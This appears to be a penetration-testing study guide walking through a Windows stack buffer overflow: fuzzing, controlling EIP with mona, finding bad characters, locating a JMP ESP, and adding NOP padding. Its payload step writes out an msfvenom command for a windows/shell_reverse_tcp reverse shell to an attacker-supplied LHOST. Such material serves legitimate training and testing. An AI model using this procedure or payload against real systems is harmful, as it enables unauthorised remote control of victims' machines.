# Mona Configuration
```
!mona config -set workingfolder c:\mona\%p
```

# Fuzzing
* Update IP and Port# and modify sent values as needed for `fuzzer.py`
* Run `python fuzzer.py`
* Make note of byte count at crash location

# Crash Replication & Controlling EIP
* Run the command `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l length-value` where length-value is 400 bytes longer than the string that crashed the server
* Copy the output of the above command and place it into the payload variable of the `exploit.py` script
* Run `python exploit.py`
* Run the following mona command in Immunity `!mona findmsp -distance length-of-created-pattern`
* Mona will display a log window with the output of the command. If not, click "Window" and then "Log data" (choose "CPU" to switch back to the standard view)
* Output should look like
```
EIP contains normal pattern : ... (offset XXXX)
```
* Update the `exploit.py` script and set the offset variable to this value (default is set to 0).
* Set the payload variable to an empty string again
* Set the retn variable to `BBBB`
* Run `exploit.py` again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242)

# Finding Bad Characters
* Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the `bytearray.bin` file that is generated (if the working folder was set per the Mona Configuration above, then the location should be C:\mona\oscp\bytearray.bin)
```
!mona bytearray -b "\x00"
```
* Now generate a string of bad chars that is identical to the bytearray (bytearray.py)
* Update `exploit.py` and set the payload variable to the string of bad chars the script generates
* Re-run `exploit.py`
* Make note of the address to which the ESP register points and use it in the following mona command
```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```
* A popup window should appear labelled **mona Memory comparison results**. If not, use "Window" to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file
* The first badchar in the list should be the null byte (\x00). Make note of any others
* Generate a new bytearray in mona specifying the new badchars along with \x00 `!mona bytearray -b "\x00 bad-chars"`
* Update the payload variable in `exploit.py` and remove the new badchars as well
* Re-run `exploit.py`
* Repeat the badchar comparison until the results status returns **Unmodified**. This indicates that no more badchars exist

# Finding a Jump Point
* With the binary in a running or crashed state, run the following mona command, making sure to update the `-cpb` option with all the badchars identified (including \x00)
```
!mona jmp -r esp -cpb "\x00"
```
* This command find all "JMP ESP" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log Data" window
* Choose an address and update `exploit.py` setting the retn variable to the address, written backwards (little endian)

# Generate Payload
* Copy the generated python code from the below command into `exploit.py`'s `payload` variable equal to the `buf` variable
```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py
```

# Prepend NOPs
* Since an encoder is likely used to generate the payload, it will need some space in memory for the payload to unpack itself. This can be done by setting the `padding` variable to a string of 16 or more "No Operation" (\x90) bytes:
```
padding = "\x90" * 16
```

# Exploit
With the correct prefix, offset, return address, padding, and payload set, a reverse shell should now be possible
